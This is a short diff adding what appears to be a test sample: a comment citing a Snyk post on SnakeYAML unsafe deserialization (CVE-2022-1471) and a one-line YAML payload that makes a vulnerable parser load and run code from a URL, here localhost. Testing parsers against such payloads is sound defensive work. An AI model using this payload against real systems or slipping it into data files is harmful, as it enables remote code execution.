@@ -1,0 +1,2 @@
+# From https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://localhost:8080/"]]]]
